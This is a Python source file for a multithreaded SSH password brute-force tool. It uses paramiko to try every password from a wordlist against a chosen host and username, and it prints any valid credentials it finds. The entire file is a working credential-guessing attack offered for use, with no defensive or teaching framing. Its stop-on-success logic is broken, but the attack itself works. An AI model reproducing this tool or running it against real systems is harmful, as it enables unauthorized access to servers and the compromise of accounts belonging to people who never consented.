import argparse
import paramiko
import threading

def ssh_brute_force(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, port=port, username=username, password=password)
        print(f"[*] Found valid credentials: {username}:{password}")
        print('exiting...')
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"[-] SSH error: {e}")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser(description="Multithreaded brute force tool for SSH and other services")
    parser.add_argument("-H", "--hostname", required=True, help="Target hostname or IP address")
    parser.add_argument("-p", "--port", type=int, default=22, help="Target port")
    parser.add_argument("-u", "--username", required=True, help="Username to authenticate with")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use")
    args = parser.parse_args()

    with open(args.wordlist, "r", encoding="latin-1") as f:
        passwords = f.readlines()

    threads = []
    for password in passwords:
        password = password.strip()
        thread = threading.Thread(target=ssh_brute_force, args=(args.hostname, args.port, args.username, password))
        threads.append(thread)
        thread.start()
        if len(threads) >= args.threads:
            for thread in threads:
                thread.join()
            threads = []
            if any(thread.is_alive() for thread in threads):
                break

if __name__ == "__main__":
    main()